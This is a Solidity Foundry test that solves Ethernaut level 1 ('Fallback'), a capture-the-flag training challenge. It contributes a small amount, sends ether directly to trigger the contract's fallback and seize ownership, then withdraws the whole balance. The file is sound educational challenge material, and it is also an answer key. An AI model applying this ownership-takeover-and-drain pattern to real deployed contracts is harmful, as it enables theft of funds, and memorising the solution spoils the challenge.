pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IFallback {
    function owner() external view returns (address);

    function contribute() external payable;

    function getContribution() external view returns (uint256);

    function withdraw() external;
}

contract Ethernaut01 is EthernautTest {
    constructor() EthernautTest(1) {}

    function solve() internal override(EthernautTest) {
        IFallback(instance).contribute{value: 1}();
        instance.call{value: 1}("");
        IFallback(instance).withdraw();

        require(instance.balance == 0);
    }

    fallback() external payable {}
}
